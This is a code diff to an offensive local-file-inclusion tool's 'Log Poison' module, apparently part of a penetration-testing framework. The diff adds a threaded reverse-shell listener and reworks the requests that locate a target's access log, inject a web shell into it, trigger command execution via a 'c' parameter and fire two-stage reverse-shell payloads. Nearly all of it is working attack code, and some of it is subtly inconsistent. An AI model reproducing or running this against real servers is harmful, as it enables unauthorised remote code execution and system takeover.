@@ -1,5 +1,6 @@
 """Log Poison"""
 import os
+import threading
 
 from src.utils.arguments import init_args
 from src.httpreqs import request
@@ -8,7 +9,7 @@ from src.utils.args_check import scriptDirectory
 from src.utils import colors
 from src.utils.info import printFancyString
 from src.utils.info import printInfo
-
+from src.servers.LFIshell import start_listener
 
 def exploit_log_poison(
     ip, port, url, payloadStageOne, payloadStageTwo, testPayload, testString, post
@@ -30,7 +31,8 @@ def exploit_log_poison(
             + scriptDirectory
             + os.sep
             + "src/wordlists/http_access_log.txt"
-            + "' file that contains log locations"
+            + "' file that contains log locations",
+            flush = True
         )
         return
 
@@ -75,8 +77,19 @@ def exploit_log_poison(
                     + colors.green("[.]")
                     + " Located canary in target's access log at '"
                     + line
-                    + "'"
+                    + "'",
+                    flush = True
                 )
+
+                print(
+                    colors.green("[.]")
+                    + " Poisoning access log with the shell code... ",
+                    flush = True
+                )
+
+                # First start the reverse listener
+                thread = threading.Thread(target=start_listener, args=(args.lport,))
+                thread.start()
 
                 # Upload web shell inside log
                 if post:
@@ -100,21 +113,33 @@ def exploit_log_poison(
                         exploit=True,
                     )
 
+                # Exploit to RCE
                 if config.tempArg in url:
                     if "?" in url:
+                        # Append ampersand as the Nth  parameter value
                         exploitUrl = (
                             url.replace(config.tempArg, line) + "&c=" + testPayload
                         )
                     else:
+                        # Append questionmark as first parameter value
                         exploitUrl = (
                             url.replace(config.tempArg, line) + "?c=" + testPayload
                         )
 
+                    res, _ = request.REQUEST(
+                    exploitUrl,
+                    args.httpheaders,
+                    post,
+                    config.proxies,
+                    "",
+                    "",
+                    exploit=True,
+                )
+
                 elif config.tempArg in post:
                     exploitPost = post + "&c=" + payloadStageOne
 
-                print(exploitUrl)
-                res, _ = request.REQUEST(
+                    res, _ = request.REQUEST(
                     exploitUrl,
                     args['httpheaders'],
                     post,
@@ -130,7 +155,8 @@ def exploit_log_poison(
                     if config.tempArg in post:
                         print(
                             colors.green("[.]")
-                            + " Executing stage 1 of the revshell payload..."
+                            + " Executing stage 1 of the revshell payload...",
+                            flush = True
                         )
                         request.REQUEST(
                             url,
@@ -145,7 +171,8 @@ def exploit_log_poison(
                         if payloadStageTwo != "":
                             print(
                                 colors.green("[.]")
-                                + " Executing stage 2 of the revshell payload..."
+                                + " Executing stage 2 of the revshell payload...",
+                                flush = True
                             )
                             request.REQUEST(
                                 url,
@@ -165,7 +192,8 @@ def exploit_log_poison(
                         )
                         print(
                             colors.green("[.]")
-                            + " Executing stage 1 of the revshell payload..."
+                            + " Executing stage 1 of the revshell payload...",
+                            flush = True
                         )
                         request.REQUEST(
                             exploitUrl,
@@ -185,7 +213,8 @@ def exploit_log_poison(
                             )
                             print(
                                 colors.green("[.]")
-                                + " Executing stage 2 of the revshell payload. Check your listener..."
+                                + " Executing stage 2 of the revshell payload. Check your listener...",
+                                flush = True
                             )
                             request.REQUEST(
                                 exploitUrl,
@@ -196,13 +225,17 @@ def exploit_log_poison(
                                 "",
                                 exploit=True,
                             )
+                        
+                        # Join the listener thread, with 10 second timeout in case deadlock, unexpected expections or other errors occur in the meantime
+                        # This will make sure that execution continues no matter the occurring issues in the thread
+                        thread.join(timeout=10)
                         break
         else:
             # lastPrintedStringLen = printFancyString("", lastPrintedStringLen)
             if args['verbose']:
                 printFancyString(
                     colors.red("[-]")
-                    + " Couldn't locate target server's access log to poison or log is not readable.\n",
+                    + " Couldn't locate target server's access log to poison/log is not readable.\n",
                     lastPrintedStringLen,
                 )
             else:
